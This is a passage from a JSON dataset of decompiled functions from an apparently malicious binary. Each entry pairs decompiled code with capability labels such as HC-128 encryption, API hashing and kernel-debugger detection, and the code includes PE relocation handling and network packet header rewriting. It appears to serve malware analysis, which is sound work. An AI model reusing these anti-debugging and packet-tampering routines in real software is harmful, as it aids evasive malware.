code_r0x0002cc40;\n        }\n        if (iVar3 == -3) {\ncode_r0x0002cc2b:\n            arg1 = arg1 + -1;\n            uVar2 = uVar2 | *arg1 << 0x18;\n            goto code_r0x0002cc38;\n        }\n        if (iVar3 == -2) {\ncode_r0x0002cc1e:\n            arg1 = arg1 + -1;\n            uVar2 = uVar2 | *arg1 << 0x10;\n            goto code_r0x0002cc2b;\n        }\n        if (iVar3 == -1) {\ncode_r0x0002cc11:\n            arg1 = arg1 + -1;\n            uVar2 = uVar2 | *arg1 << 8;\n            goto code_r0x0002cc1e;\n        }\n        if (iVar3 == 0) {\n            arg1 = arg1 + -1;\n            uVar2 = *arg1;\n            goto code_r0x0002cc11;\n        }\n    }\n    uStack104 = uVar1 ^ uStack104;\n    uStack100 = uVar2 ^ uStack100;\n    fcn.0002c014(&uStack104, arg4);\n    *arg2 = uStack104 >> 0x18;\n    arg2[1] = uStack104 >> 0x10;\n    arg2[2] = uStack104 >> 8;\n    arg2[3] = uStack104;\n    arg2[4] = uStack100 >> 0x18;\n    arg2[5] = uStack100 >> 0x10;\n    arg2[6] = uStack100 >> 8;\n    arg2[7] = uStack100;\ncode_r0x0002ccde:\n    *in_stack_00000028 = uStack104 >> 0x18;\n    in_stack_00000028[1] = uStack104 >> 0x10;\n    in_stack_00000028[2] = uStack104 >> 8;\n    in_stack_00000028[3] = uStack104;\n    in_stack_00000028[4] = uStack100 >> 0x18;\n    in_stack_00000028[5] = uStack100 >> 0x10;\n    in_stack_00000028[6] = uStack100 >> 8;\n    in_stack_00000028[7] = uStack100;\n    return;\n}\n",
        "token_count": 2668
    },
    "00035414": {
        "rules": [
            "hash data using aphash/10489b186fc44711a1078750698db7a9",
            "encrypt data using HC-128/1d01b23c04404fe18b84a06c7e7d83b0"
        ],
        "decompiled_code": "\nulong fcn.00035414(int16_t *arg1, ulong arg2, ulong arg3)\n\n{\n    char *pcVar1;\n    int16_t iVar2;\n    uint32_t uVar3;\n    char cVar4;\n    ulong uVar5;\n    int64_t iVar6;\n    uint64_t uVar7;\n    int16_t *piVar8;\n    uint64_t uVar9;\n    char acStack312 [280];\n    \n    iVar6 = -1;\n    piVar8 = arg1;\n    do {\n        if (iVar6 == 0) break;\n        iVar6 = iVar6 + -1;\n        iVar2 = *piVar8;\n        piVar8 = piVar8 + 1;\n    } while (iVar2 != 0);\n    uVar7 = 0;\n    uVar3 = ~iVar6;\n    if (uVar3 - 9 < 0xfa) {\n        fcn.000328b8(arg1, acStack312, 0x104);\n        iVar6 = uVar3 - 1;\n        uVar9 = uVar7;\n        if (0 < iVar6) {\n            do {\n                pcVar1 = acStack312 + uVar7;\n                uVar7 = uVar7 + 1;\n                uVar9 = uVar9 + *pcVar1;\n            } while (uVar7 < iVar6);\n        }\n        cVar4 = (uVar9 & 0xff) / 0x1a;\n        acStack312[iVar6] = cVar4 + 'a';\n        acStack312[iVar6 + 1] = (cVar4 * '\\x1a' - (uVar9 & 0xff)) + 'z';\n        fcn.0003285c(acStack312 + iVar6, arg2, 2);\n        fcn.0003285c(acStack312 + uVar3, arg3, 2);\n        uVar5 = 1;\n    }\n    else {\n        uVar5 = 0;\n    }\n    return uVar5;\n}\n",
        "token_count": 449
    },
    "000354e4": {
        "rules": [
            "hash data using aphash/10489b186fc44711a1078750698db7a9",
            "encrypt data using HC-128/1d01b23c04404fe18b84a06c7e7d83b0"
        ],
        "decompiled_code": "\nvoid fcn.000354e4(void)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    ulong uVar3;\n    int64_t arg1;\n    int64_t iVar4;\n    uint32_t uVar5;\n    uint64_t arg3;\n    uint32_t uStackX8;\n    uint32_t auStackX16 [2];\n    uint32_t auStackX24 [2];\n    int32_t aiStackX32 [2];\n    int32_t iStack72;\n    uint16_t uStack68;\n    int64_t iStack64;\n    ulong uStack56;\n    \n    iVar2 = fcn.00022138(0xfffffffe, 0x73, auStackX16, &iStack64);\n    if (iVar2 == 0) {\n        uVar3 = (**0x11140)(iStack64);\n        uStack56 = uVar3;\n        (**0x11138)();\n        uVar5 = 0;\n        if (auStackX16[0] != 0) {\n            iVar4 = 0;\n            do {\n                iVar2 = fcn.0003335c(*(iVar4 + 0xc + iStack64));\n                if (iVar2 == 0) {\n                    fcn.0002225c(*(iVar4 + iStack64), *(iVar4 + 8 + iStack64), *(iVar4 + 4 + iStack64));\n                }\n                else {\n                    iVar2 = fcn.00032e88(uVar5, &iStack72, 6);\n                    if (iVar2 == 0) {\n                        if ((*(iVar4 + 0x14 + iStack64) == iStack72) && (*(iVar4 + 0x18 + iStack64) == uStack68)) {\n                            iVar2 = fcn.00032f00(uVar5, auStackX24);\n                            if (iVar2 == 0) {\n                                uVar1 = *(iVar4 + 0x10 + iStack64);\n                                if (uVar1 != auStackX24[0]) {\n                                    iVar2 = fcn.000331cc(uVar5, aiStackX32);\n                                    if (iVar2 != 0) goto code_r0x00035718;\n                                    if (aiStackX32[0] == 0) {\n                                        fcn.000460ec(uVar5, uVar1);\n                                    }\n                                    else {\n                                        fcn.0003a7e8(uVar5, uVar1);\n                                    }\n                                }\n                                uVar1 = *(iVar4 + 0x30 + iStack64);\n                                if (uVar1 == 0) {\n                                    arg1 = 0;\n                                    arg3 = 0;\n                                    uStackX8 = 0;\ncode_r0x000356fb:\n                                    fcn.000335c4(uVar5, arg1, arg3);\n                                }\n                                else {\n                                    arg1 = fcn.00030cc4(uVar1);\n                                    if (arg1 != 0) {\n                                        iVar2 = fcn.0002220c(*(iVar4 + iStack64), *(iVar4 + 8 + iStack64), \n                                                             *(iVar4 + 4 + iStack64), 0);\n                                        if (iVar2 == 0) {\n                                            if ((uStackX8 & 7) == 0) {\n                                                uStackX8 = uStackX8 >> 3;\n                                                iVar2 = fcn.00056a24(arg1, uStackX8);\n                                                if (iVar2 != 0) {\n                                                    arg3 = uStackX8;\n                                                    goto code_r0x000356fb;\n                                                }\n                                                fcn.0002225c(*(iVar4 + iStack64), *(iVar4 + 8 + iStack64), \n                                                             *(iVar4 + 4 + iStack64));\n                                                fcn.00030d24(arg1);\n                                            }\n                                            else {\n                                                fcn.0002225c(*(iVar4 + iStack64), *(iVar4 + 8 + iStack64), \n                                                             *(iVar4 + 4 + iStack64));\n                                                fcn.00030d24(arg1);\n                                            }\n                                        }\n                                    }\n                                }\n                            }\n                        }\n                        else {\n                            fcn.0002225c(*(iVar4 + iStack64), *(iVar4 + 8 + iStack64), *(iVar4 + 4 + iStack64));\n                        }\n                    }\n                }\ncode_r0x00035718:\n                uVar5 = uVar5 + 1;\n                iVar4 = iVar4 + 0x40;\n            } while (uVar5 < auStackX16[0]);\n        }\n        (**0x11130)(uVar3);\n        (*_fcn.00011128)(uVar3);\n        fcn.000207c4(iStack64);\n    }\n    return;\n}\n",
        "token_count": 1047
    },
    "0002e874": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint64_t fcn.0002e874(int32_t *arg1, ulong noname_1, ulong *arg3, uint *arg4)\n\n{\n    uint32_t uVar1;\n    int16_t iVar2;\n    uint16_t uVar3;\n    ulong uVar4;\n    ulong uVar5;\n    uint uVar6;\n    uint uVar7;\n    uint uVar8;\n    uint *puVar9;\n    ulong *puVar10;\n    uint64_t uVar11;\n    uint64_t uVar12;\n    int64_t iVar13;\n    uint16_t uVar14;\n    uint8_t uVar15;\n    int16_t *piVar16;\n    uint64_t uVar17;\n    int16_t *piVar18;\n    uint64_t uVar19;\n    \n    if (*0x7ef08 == NULL) {\n        *0x7ef08 = fcn.00030c98(0xa28);\n        if (*0x7ef08 == NULL) {\n            return 0;\n        }\n        *0x7ee78 = *0x7ef08 + 0x104;\n        *0x7ee60 = *0x7ef08 + 0x208;\n        *0x7ee38 = *0x7ef08 + 0x30c;\n        piVar16 = *0x7ef08 + 0x410;\n        *0x7ee50 = *0x7ef08;\n        fcn.00028f8c(*0x7ef08, 0x104);\n        fcn.00028fe4(*0x7ee78, 0x104);\n        fcn.00028e84(piVar16, 0x104);\n        fcn.00066788(*0x7ee60, 0x119cc, piVar16);\n        fcn.00028edc(piVar16, 0x104);\n        fcn.00066788(*0x7ee38, 0x119cc, piVar16);\n        uVar12 = 0xffffffffffffffff;\n        uVar11 = uVar12;\n        piVar16 = *0x7ee50;\n        do {\n            if (uVar11 == 0) break;\n            uVar11 = uVar11 - 1;\n            iVar2 = *piVar16;\n            piVar16 = piVar16 + 1;\n        } while (iVar2 != 0);\n        *0x7ee40 = (~uVar11 - 1) * 2;\n        uVar11 = uVar12;\n        piVar16 = *0x7ee78;\n        do {\n            if (uVar11 == 0) break;\n            uVar11 = uVar11 - 1;\n            iVar2 = *piVar16;\n            piVar16 = piVar16 + 1;\n        } while (iVar2 != 0);\n        *0x7ee48 = (~uVar11 - 1) * 2;\n        uVar11 = uVar12;\n        piVar16 = *0x7ee60;\n        do {\n            if (uVar11 == 0) break;\n            uVar11 = uVar11 - 1;\n            iVar2 = *piVar16;\n            piVar16 = piVar16 + 1;\n        } while (iVar2 != 0);\n        *0x7ee68 = (~uVar11 - 1) * 2;\n        piVar16 = *0x7ee38;\n        do {\n            if (uVar12 == 0) break;\n            uVar12 = uVar12 - 1;\n            iVar2 = *piVar16;\n            piVar16 = piVar16 + 1;\n        } while (iVar2 != 0);\n        *0x7ee58 = (~uVar12 - 1) * 2;\n    }\n    uVar11 = *0x7ee48;\n    uVar12 = *0x7ee40;\n    *arg4 = 0;\n    if (arg1 == NULL) {\n        return arg4 & 0xffffffffffffff00;\n    }\n    puVar9 = arg4;\n    if (noname_1 != '\\0') {\n        puVar9 = (**0x11330)(arg1, 0x30, 4);\n        uVar12 = *0x7ee40;\n        uVar11 = *0x7ee48;\n    }\n    if ((*arg1 != 0x30) || ((arg1[6] & 0xfffff80dU) != 0)) {\n        return puVar9 & 0xffffffffffffff00;\n    }\n    puVar10 = *(arg1 + 4);\n    if (puVar10 == NULL) {\n        return 0;\n    }\n    if (noname_1 == '\\0') {\n        uVar6 = *(puVar10 + 4);\n        uVar7 = *(puVar10 + 1);\n        uVar8 = *(puVar10 + 0xc);\n        *arg3 = *puVar10;\n        *(arg3 + 4) = uVar6;\n        *(arg3 + 1) = uVar7;\n        *(arg3 + 0xc) = uVar8;\n    }\n    else {\n        if (**0x11358 <= puVar10) {\n            puVar10 = **0x11358;\n        }\n        uVar4 = *puVar10;\n        uVar5 = puVar10[1];\n        *arg3 = uVar4;\n        arg3[1] = uVar5;\n        puVar10 = (**0x11330)(uVar4, arg3[1], *arg3, 2);\n        uVar12 = *0x7ee40;\n        uVar11 = *0x7ee48;\n    }\n    uVar15 = 0;\n    piVar16 = NULL;\n    uVar19 = 0;\n    if (((*arg3 & 1) != 0) || (*arg3 == 0xfffe)) {\n        return puVar10 & 0xffffffffffffff00;\n    }\n    uVar17 = *arg3;\n    if (((uVar17 == uVar12) ||\n        ((uVar12 < uVar17 && (puVar10 = arg3[1],  *(puVar10 + (uVar12 & 0xfffffffffffffffe)) == 0x5c)))) &&\n       (puVar10 = fcn.00031328(arg3[1], *0x7ee50, uVar12 >> 1),  uVar11 = *0x7ee48,  puVar10 == 0)) {\n        uVar15 = 1;\n        uVar19 = *0x7ee40;\n        piVar16 = *0x7ee50;\n    }\n    else if (((uVar17 == uVar11) ||\n             ((uVar11 < uVar17 && (puVar10 = arg3[1],  *(puVar10 + (uVar11 & 0xfffffffffffffffe)) == 0x5c)))) &&\n            (puVar10 = fcn.00031328(arg3[1], *0x7ee78, uVar11 >> 1),  puVar10 == 0)) {\n        uVar15 = 1;\n        uVar19 = *0x7ee48;\n        piVar16 = *0x7ee78;\n    }\n    else if (((uVar17 == *0x7ee68) ||\n             ((*0x7ee68 < uVar17 && (puVar10 = arg3[1],  *(puVar10 + (*0x7ee68 & 0xfffffffffffffffe)) == 0x5c)))) &&\n            (puVar10 = fcn.00031328(arg3[1], *0x7ee60, *0x7ee68 >> 1),  puVar10 == 0)) {\n        uVar15 = 1;\n        uVar19 = *0x7ee68;\n        piVar16 = *0x7ee50;\n    }\n    else {\n        if (((uVar17 == *0x7ee58) ||\n            ((*0x7ee58 < uVar17 && (puVar10 = arg3[1],  *(puVar10 + (*0x7ee58 & 0xfffffffffffffffe)) == 0x5c)))) &&\n           (puVar10 = fcn.00031328(arg3[1], *0x7ee38, *0x7ee58 >> 1),  puVar10 == 0)) {\n            uVar15 = 1;\n            uVar19 = *0x7ee58;\n            piVar16 = *0x7ee78;\n        }\n        if (uVar15 == 0) goto code_r0x0002ecb3;\n    }\n    iVar13 = -1;\n    piVar18 = piVar16;\n    do {\n        if (iVar13 == 0) break;\n        iVar13 = iVar13 + -1;\n        iVar2 = *piVar18;\n        piVar18 = piVar18 + 1;\n    } while (iVar2 != 0);\n    uVar3 = (~iVar13 - 1) * 2;\n    uVar1 = (*arg3 - (uVar19 & 0xffff)) + uVar3;\n    uVar14 = uVar1;\n    *arg3 = uVar14;\n    *(arg3 + 2) = uVar14;\n    iVar13 = fcn.00030c98(uVar1 & 0xffff);\n    if (iVar13 == 0) {\n        *arg4 = 0xc000009a;\n        return arg4 & 0xffffffffffffff00 | uVar15;\n    }\n    fcn.0006670a(iVar13, piVar16, uVar3);\n    puVar10 = fcn.0006670a(uVar3 + iVar13, uVar19 + arg3[1], *arg3 - uVar3);\n    arg3[1] = iVar13;\ncode_r0x0002ecb3:\n    return puVar10 & 0xffffffffffffff00 | uVar15;\n}\n",
        "token_count": 2213
    },
    "0004251c": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nulong fcn.0004251c(uint16_t *arg1, ulong arg2, int64_t arg3)\n\n{\n    uint16_t *puVar1;\n    uint8_t uVar2;\n    uint16_t uVar3;\n    uint16_t uVar4;\n    uint uVar5;\n    uint32_t uVar6;\n    int16_t iVar7;\n    uint16_t *puVar8;\n    int32_t iVar9;\n    int64_t iVar10;\n    uint32_t uVar11;\n    uint16_t *arg1_00;\n    uint32_t *puVar12;\n    uint16_t *puVar13;\n    uint uStack136;\n    uint uStack132;\n    uchar uStack128;\n    uint8_t uStack127;\n    uint16_t uStack126;\n    ulong uStack120;\n    ulong uStack112;\n    ulong uStack104;\n    ulong uStack96;\n    uint16_t uStack88;\n    uint16_t uStack86;\n    \n    puVar13 = NULL;\n    if ((*arg1 & 0xf0) == 0x40) {\n        uVar2 = *arg1;\n        arg1[3] = 0;\n        *(arg1 + 4) = 0x80;\n        *0x803b4 = *0x803b4 + 1;\n        uVar3 = fcn.00030df4();\n        arg1[2] = uVar3;\n        uVar3 = fcn.00030df4();\n        arg1[5] = 0;\n        arg1[1] = uVar3;\n        arg1_00 = arg1 + 10;\n        uVar11 = arg1[9] + arg1[8] + arg1[7] + arg1[6] + arg1[4] + *arg1 + uVar3 + arg1[3] + arg1[2];\n        puVar8 = arg1_00;\n        for (iVar9 = (uVar2 & 0xf) * 4 + -0x14; iVar9 != 0; iVar9 = iVar9 + -4) {\n            uVar3 = *puVar8;\n            puVar1 = puVar8 + 1;\n            puVar8 = puVar8 + 2;\n            uVar11 = uVar11 + uVar3 + *puVar1;\n        }\n        uStack127 = *(arg1 + 9);\n        iVar9 = (uVar11 >> 0x10) + (uVar11 & 0xffff);\n        uVar11 = arg2 - 0x14;\n        arg1[5] = ~((iVar9 >> 0x10) + iVar9);\n    }\n    else {\n        arg1[2] = *(arg3 + 0x18) - 0x36;\n        uVar3 = fcn.00030df4();\n        uStack127 = *(arg1 + 3);\n        arg1_00 = arg1 + 0x14;\n        *(arg1 + 7) = 0x80;\n        uVar11 = arg2 - 0x28;\n        arg1[2] = uVar3;\n        puVar13 = arg1;\n    }\n    if (uStack127 == 1) {\n        if (uVar11 < 4) {\n            return 0x2159000a;\n        }\n        if (*arg1_00 == 8) {\n            *arg1_00 = 0;\n        }\n        else if (*arg1_00 == 0xd) {\n            *arg1_00 = 0xe;\n        }\n        else if (*arg1_00 == 0xf) {\n            *arg1_00 = 0x10;\n        }\n        else if (*arg1_00 == 0x11) {\n            *arg1_00 = 0x12;\n        }\n        else {\n            *arg1_00 = 3;\n            *(arg1_00 + 1) = 1;\n        }\n        puVar12 = arg1_00 + 2;\n        if ((*(arg3 + 0x30) & 1) != 0) {\n            if ((*(arg3 + 0x30) & 8) != 0) {\n                *puVar12 = *(arg3 + 0x38);\n                puVar12 = arg1_00 + 4;\n            }\n            uVar6 = fcn.00030dc8(*puVar12);\n            uVar6 = uVar6 & 0xbfffffff;\n            if ((*(arg3 + 0x30) & 2) != 0) {\n                uVar6 = uVar6 | 0x40000000;\n            }\n            uVar6 = fcn.00030dc8(uVar6);\n            *puVar12 = uVar6;\n        }\n        arg1_00[1] = 0;\n        uVar3 = fcn.00041240(arg1_00, uVar11 + *(arg3 + 0x28));\n        arg1_00[1] = uVar3;\n    }\n    else if (uStack127 == 6) {\n        if (uVar11 < 0x14) {\n            return 0x2159000a;\n        }\n        iVar10 = 2;\n        puVar8 = arg1_00;\n        do {\n            uVar2 = *(puVar8 + 1);\n            *(puVar8 + 1) = *puVar8;\n            *puVar8 = uVar2;\n            puVar8 = puVar8 + 1;\n            iVar10 = iVar10 + -1;\n        } while (iVar10 != 0);\n        iVar7 = *(arg3 + 0x28) + uVar11;\n        if (puVar13 == NULL) {\n            uStack136 = *(arg1 + 6);\n            uStack128 = 0;\n            uStack132 = *(arg1 + 8);\n            uStack126 = fcn.00030df4(iVar7);\n            arg1_00[8] = 0;\n            uVar3 = fcn.00040bc8(&uStack136, arg1_00, uVar11 + *(arg3 + 0x28));\n        }\n        else {\n            fcn.00030df4(iVar7);\n            arg1_00[8] = 0;\n            uVar3 = fcn.00040d50(&uStack136, arg1_00, uVar11 + *(arg3 + 0x28));\n        }\n        arg1_00[8] = uVar3;\n    }\n    else if (uStack127 == 0x11) {\n        if (uVar11 < 8) {\n            return 0x2159000a;\n        }\n        iVar10 = 2;\n        puVar8 = arg1_00;\n        do {\n            uVar2 = *(puVar8 + 1);\n            *(puVar8 + 1) = *puVar8;\n            *puVar8 = uVar2;\n            puVar8 = puVar8 + 1;\n            iVar10 = iVar10 + -1;\n        } while (iVar10 != 0);\n        uStack126 = fcn.00030df4();\n        arg1_00[2] = uStack126;\n        if (puVar13 == NULL) {\n            uStack136 = *(arg1 + 6);\n            uStack128 = 0;\n            uStack132 = *(arg1 + 8);\n            arg1_00[3] = 0;\n            uVar3 = fcn.00030df4(uStack126);\n            uVar3 = fcn.000410e0(&uStack136, arg1_00, uVar3);\n        }\n        else {\n            uStack120 = *(puVar13 + 4);\n            uStack112 = *(puVar13 + 8);\n            uStack104 = *(puVar13 + 0xc);\n            uStack96 = *(puVar13 + 0x10);\n            uStack88 = 0x1100;\n            arg1_00[3] = 0;\n            uStack86 = uStack126;\n            uVar3 = fcn.00030df4(uStack120, uStack104, uStack126);\n            uVar3 = fcn.00040f2c(&uStack120, arg1_00, uVar3);\n        }\n        arg1_00[3] = uVar3;\n    }\n    else if (uStack127 == 0x3a) {\n        if (puVar13 == NULL) {\n            return 0x2159000a;\n        }\n        if (uVar11 < 8) {\n            return 0x2159000a;\n        }\n        if (*arg1_00 == 0x80) {\n            *arg1_00 = 0x81;\n        }\n        else if (*arg1_00 == 0x82) {\n            *arg1_00 = 0x83;\n        }\n        else {\n            *arg1_00 = 1;\n            *(arg1_00 + 1) = 3;\n        }\n        uStack120 = *(puVar13 + 4);\n        uStack112 = *(puVar13 + 8);\n        uStack104 = *(puVar13 + 0xc);\n        uStack96 = *(puVar13 + 0x10);\n        uStack86 = fcn.00030df4(uStack120, uStack104);\n        uVar3 = puVar13[2];\n        arg1_00[1] = 0;\n        uStack88 = uVar3;\n        if ((*(arg3 + 0x30) & 1) != 0) {\n            if ((*(arg3 + 0x30) & 8) != 0) {\n                *(arg1_00 + 2) = *(arg3 + 0x38);\n            }\n            uVar11 = fcn.00030dc8(*(arg1_00 + 4));\n            uVar11 = uVar11 & 0xbfffffff;\n            if ((*(arg3 + 0x30) & 2) != 0) {\n                uVar11 = uVar11 | 0x40000000;\n            }\n            uVar5 = fcn.00030dc8(uVar11);\n            *(arg1_00 + 4) = uVar5;\n            uVar4 = fcn.00030df4();\n            uVar5 = fcn.00030dc8(uVar4 - 8);\n            *(arg1_00 + 6) = uVar5;\n        }\n        uVar3 = fcn.00030df4(uVar3);\n        uVar3 = fcn.0004136c(&uStack120, arg1_00, uVar3);\n        arg1_00[1] = uVar3;\n    }\n    return 0;\n}\n",
        "token_count": 2387
    },
    "0004295c": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nvoid fcn.0004295c(int64_t arg1)\n\n{\n    uchar uVar1;\n    int16_t iVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint *arg1_00;\n    uint64_t arg1_01;\n    uint *puVar5;\n    uint *puVar6;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    uchar *puVar9;\n    int64_t iVar10;\n    int64_t iVar11;\n    int64_t iVar12;\n    uint auStackX8 [2];\n    uint uStackX16;\n    uint auStackX24 [2];\n    uint uStackX32;\n    ushort uStackX36;\n    uint uStack344;\n    ushort uStack340;\n    ushort auStack328 [4];\n    uint uStack320;\n    uint uStack316;\n    uint uStack312;\n    uint uStack308;\n    uchar auStack200 [136];\n    \n    auStackX8[0] = *(arg1 + 8);\n    iVar11 = 0x10;\n    iVar12 = 4;\n    if ((*(arg1 + 0x30) & 0x10) == 0) {\n        uVar8 = *(arg1 + 0x28) + *(arg1 + 0x18);\n        arg1_01 = uVar8;\n        if (uVar8 < 0x3d) {\n            arg1_01 = 0x3c;\n        }\n        arg1_00 = fcn.00030cc4(arg1_01);\n        if (arg1_00 == NULL) {\n            return;\n        }\n    }\n    else {\n        *(arg1 + 0x18) = *(arg1 + 0x18) + -4;\n        arg1_00 = fcn.00030cc4(*(arg1 + 0x18) + 0x400);\n        if (arg1_00 == NULL) {\n            return;\n        }\n        uVar8 = *(arg1 + 0x18);\n        iVar3 = *(arg1 + 0x48);\n        *(arg1_00 + uVar8 + 0x200) = *(arg1 + 0x38);\n        fcn.0006670a(arg1_00 + uVar8 + 0x204, *(arg1 + 0x40), *(arg1 + 0x48));\n        iVar3 = fcn.00059c10(arg1_00 + uVar8 + 0x200, iVar3 + 4, *(arg1 + 0x20), *(arg1 + 0x28));\n        if (iVar3 == 0) goto code_r0x00042c6c;\n        *(arg1 + 0x28) = uStackX16;\n    }\n    fcn.0006670a(arg1_00, *(arg1 + 0x10), *(arg1 + 0x18));\n    if ((*(arg1 + 0x30) & 0x10) == 0) {\n        fcn.0006670a(*(arg1 + 0x18) + arg1_00, *(arg1 + 0x20), *(arg1 + 0x28));\n    }\n    uVar8 = *(arg1 + 0x28) + *(arg1 + 0x18);\n    if (uVar8 < 0x3c) {\n        fcn.0006677c(uVar8 + arg1_00, 0, 0x3c - uVar8);\n        uVar8 = 0x3c;\n    }\n    if (*(arg1 + 0x18) < 0xe) goto code_r0x00042c6c;\n    uVar7 = *(arg1 + 0x18) - 0xe;\n    iVar10 = 6;\n    puVar5 = arg1_00;\n    do {\n        uVar1 = *(puVar5 + 6);\n        *(puVar5 + 6) = *puVar5;\n        *puVar5 = uVar1;\n        puVar5 = puVar5 + 1;\n        iVar10 = iVar10 + -1;\n    } while (iVar10 != 0);\n    iVar2 = fcn.00030df4();\n    if (iVar2 == 0x800) {\n        if (((uVar7 < 0x14) || (uVar4 = (*(arg1_00 + 0xe) & 0xf) << 2,  uVar4 < 0x14)) || (uVar7 < uVar4))\n        goto code_r0x00042c6c;\n        puVar5 = arg1_00 + 0x1a;\n        puVar9 = arg1_00 + (0x1e - puVar5);\n        puVar6 = puVar5;\n        do {\n            uVar1 = puVar9[puVar6];\n            puVar9[puVar6] = *puVar6;\n            *puVar6 = uVar1;\n            puVar6 = puVar6 + 1;\n            iVar12 = iVar12 + -1;\n        } while (iVar12 != 0);\n        auStackX24[0] = *puVar5;\n        iVar3 = fcn.00034fe4(*(arg1_00 + 0x1e), auStackX8, auStackX24, &uStack344);\ncode_r0x00042c14:\n        if (iVar3 == 0) {\n            *arg1_00 = uStackX32;\n            *(arg1_00 + 1) = uStackX36;\n            *(arg1_00 + 6) = uStack344;\n            *(arg1_00 + 10) = uStack340;\n        }\n    }\n    else {\n        iVar2 = fcn.00030df4();\n        if (iVar2 == -0x7923) {\n            if (uVar7 < 0x28) goto code_r0x00042c6c;\n            puVar5 = arg1_00 + 0x26;\n            puVar9 = arg1_00 + (0x16 - puVar5);\n            puVar6 = puVar5;\n            do {\n                uVar1 = puVar9[puVar6];\n                puVar9[puVar6] = *puVar6;\n                *puVar6 = uVar1;\n                puVar6 = puVar6 + 1;\n                iVar11 = iVar11 + -1;\n            } while (iVar11 != 0);\n            fcn.0006677c(auStack328, 0, 0x80);\n            auStack328[0] = 0x17;\n            uStack320 = *puVar5;\n            uStack316 = *(arg1_00 + 0x2a);\n            uStack312 = *(arg1_00 + 0x2e);\n            uStack308 = *(arg1_00 + 0x32);\n            iVar3 = fcn.000349c0(auStack328, auStackX8, auStack200, &uStack344);\n            goto code_r0x00042c14;\n        }\n    }\n    iVar3 = fcn.0004251c(arg1_00 + 0xe, uVar7, arg1);\n    if (iVar3 == 0) {\n        (**0x80480)(auStackX8[0], arg1_00, uVar8);\n    }\ncode_r0x00042c6c:\n    fcn.00030d24(arg1_00);\n    return;\n}\n",
        "token_count": 1668
    },
    "000435ec": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nulong fcn.000435ec(ulong *arg1, uint64_t *arg2, uchar *arg3, uint64_t arg4)\n\n{\n    char cVar1;\n    uint64_t uVar2;\n    uchar uVar3;\n    ushort uVar4;\n    int32_t iVar5;\n    uint uVar6;\n    uint32_t uVar7;\n    uchar *puVar8;\n    char *pcVar9;\n    int64_t iVar10;\n    ulong uVar11;\n    uint64_t uVar12;\n    ulong uStack585;\n    uchar auStack577 [513];\n    uchar auStack64 [16];\n    \n    if ((arg4 == 0) && ((*(arg2 + 6) & 2) != 0)) {\n        iVar5 = fcn.000667b8();\n        uVar7 = iVar5 >> 0x1f & 0x1f;\n        uVar7 = (iVar5 + uVar7 & 0x1f) - uVar7;\n        arg4 = uVar7 * 8;\n        arg3 = auStack64 + -arg4;\n        puVar8 = arg3;\n        uVar12 = arg4;\n        if ((uVar7 & 0x1fffffff) != 0) {\n            do {\n                uVar3 = fcn.000667b8();\n                *puVar8 = uVar3;\n                uVar12 = uVar12 - 1;\n                puVar8 = puVar8 + 1;\n            } while (uVar12 != 0);\n        }\n    }\n    uVar11 = 0x15818;\n    if ((*(arg1 + 0x17c) & 1) != 0) {\n        uVar11 = 0x157b8;\n    }\n    fcn.00066836(&uStack585 + 1, 0x157e0, arg4 + 8, uVar11);\n    uVar12 = 0xffffffffffffffff;\n    pcVar9 = &uStack585 + 1;\n    do {\n        if (uVar12 == 0) break;\n        uVar12 = uVar12 - 1;\n        cVar1 = *pcVar9;\n        pcVar9 = pcVar9 + 1;\n    } while (cVar1 != '\\0');\n    uVar2 = *arg2;\n    uVar12 = ~uVar12;\n    iVar10 = uVar12 - 1;\n    *(&uStack585 + uVar12) = uVar2;\n    uVar6 = fcn.00030dc8(uVar2 & 0xffffffff);\n    *(&uStack585 + uVar12) = uVar6;\n    uVar4 = fcn.00030df4(*(&uStack585 + uVar12 + 4));\n    *(&uStack585 + uVar12 + 4) = uVar4;\n    if ((arg4 != 0) && (arg4 < 0x200U - iVar10)) {\n        fcn.00066752(auStack577 + uVar12, arg3, arg4);\n        iVar10 = iVar10 + arg4;\n        arg4 = 0;\n    }\n    uVar11 = fcn.00046ca8(*arg1, arg1[1], &uStack585 + 1, iVar10 + 8);\n    if ((uVar11 == 0) && ((arg4 == 0 || (uVar11 = fcn.00046ca8(*arg1, arg1[1], arg3, arg4),  uVar11 == 0)))) {\n        uVar11 = 0;\n    }\n    return uVar11;\n}\n",
        "token_count": 802
    },
    "0004d278": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nint32_t fcn.0004d278(int64_t arg1, int64_t arg2)\n\n{\n    uint16_t uVar1;\n    uint64_t uVar2;\n    int32_t *piVar3;\n    uint32_t uVar4;\n    int32_t *piVar5;\n    int64_t iVar6;\n    uint64_t uVar7;\n    uint32_t uVar8;\n    \n    iVar6 = *(arg1 + 0x3c) + arg1;\n    if (*(iVar6 + 0x18) == 0x10b) {\n        uVar2 = *(iVar6 + 0x34);\n        uVar8 = *(iVar6 + 0xa0);\n        uVar4 = *(iVar6 + 0x70);\n    }\n    else {\n        uVar8 = *(iVar6 + 0xb0);\n        uVar2 = *(iVar6 + 0x30);\n        uVar4 = *(iVar6 + 0x80);\n    }\n    arg2 = arg2 - uVar2;\n    if (arg2 != 0) {\n        if (uVar8 == 0) {\n            return -((uVar4 & 1) != 0);\n        }\n        while( true ) {\n            piVar3 = uVar8 + arg1;\n            if (piVar3[1] == 0) break;\n            uVar4 = 0;\n            piVar5 = piVar3 + 2;\n            uVar2 = piVar3[1] - 8 >> 1;\n            if ((uVar2 & 0xffff) != 0) {\n                do {\n                    uVar7 = (*piVar5 & 0xfff) + *piVar3;\n                    uVar1 = *piVar5 >> 0xc;\n                    if (uVar1 != 0) {\n                        if (uVar1 == 1) {\n                            *(uVar7 + arg1) = 